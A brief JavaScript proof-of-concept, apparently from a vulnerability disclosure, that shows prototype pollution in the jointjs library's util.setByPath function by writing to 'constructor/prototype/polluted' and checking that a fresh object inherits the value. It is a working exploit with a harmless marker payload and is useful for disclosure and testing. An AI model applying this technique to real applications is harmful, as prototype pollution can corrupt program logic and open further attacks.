var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const jointjs = require('jointjs');
jointjs.util.setByPath(obj, 'constructor/prototype/polluted', 'yes', '/');
console.log({}.polluted);